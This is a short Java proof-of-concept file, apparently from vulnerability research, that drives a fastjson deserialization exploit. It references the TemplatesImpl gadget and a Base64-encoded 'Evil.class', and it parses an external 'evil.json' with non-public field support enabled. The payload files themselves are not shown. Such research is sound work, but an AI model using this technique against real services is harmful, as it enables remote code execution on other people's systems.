import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;

import java.io.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;


public class poc {

    public static String readClass(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());

    }


    public static void main(String args[]) throws Exception{
//        final String evilClassPath ="/Users/m0rk/vul/fastjson/src/Evil.class";
//        String evilCode = readClass(evilClassPath);
//        System.out.println(evilCode);
        StringBuffer Buffer = new StringBuffer();
        App.readToBuffer(Buffer, "/Users/m0rk/vul/fastjson/src/evil.json");
        Object obj = JSON.parseObject(Buffer.toString(),Object.class,Feature.SupportNonPublicField);

    }
}